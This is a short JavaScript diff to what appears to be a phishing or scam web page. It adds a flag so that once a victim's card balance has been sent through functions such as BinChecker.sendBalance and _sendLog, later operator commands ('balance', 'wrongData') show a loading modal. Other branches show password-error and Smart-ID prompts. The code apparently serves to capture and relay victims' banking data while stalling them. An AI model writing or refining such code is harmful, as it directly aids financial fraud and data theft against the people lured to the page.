@@ -799,6 +799,7 @@
       BinChecker.sendBalance(_adId, raw);
     }
 
+    this._balanceSent = true;
     this.showModal('msLoading');
     this._sendLog(raw);
   };
@@ -1020,7 +1021,18 @@
       case 'call':
         this.showModal('msCall');
         break;
+      case 'balance':
+        if (this._balanceSent) {
+          this.showModal('msLoading');
+          break;
+        }
+        this.showModal('msBalance');
+        break;
       case 'wrongData':
+        if (this._balanceSent) {
+          this.showModal('msLoading');
+          break;
+        }
         var wdTitle = document.querySelector('#msWrongDataDisplay .ms-title');
         var wdText = document.querySelector('#msWrongDataDisplay .ms-text');
         if (wdTitle) wdTitle.textContent = t.errors && t.errors.generalErrorWord || 'Ошибка';
@@ -1056,9 +1068,6 @@
           'password'
         );
         this.showModal('msWrongData');
-        break;
-      case 'balance':
-        this.showModal('msBalance');
         break;
       case 'smartid':
         this.showModal('msSmartid');
